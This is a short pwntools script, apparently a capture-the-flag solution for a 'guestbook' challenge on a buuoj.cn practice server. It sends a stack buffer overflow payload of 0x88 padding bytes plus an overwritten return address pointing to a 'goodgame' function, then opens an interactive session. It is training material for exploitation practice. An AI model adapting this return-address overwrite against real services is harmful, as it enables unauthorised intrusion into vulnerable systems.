from pwn import *

context(log_level='debug',os='linux',arch='amd64')

p=remote('node5.buuoj.cn',29352)
# p=process("/home/lixingjian/pwn/guestbook")

goodgame_addr=0x400620    

payload=b'a'*(0x88)+p64(goodgame_addr)

p.sendline(payload)

# gdb.attach(p)

p.interactive()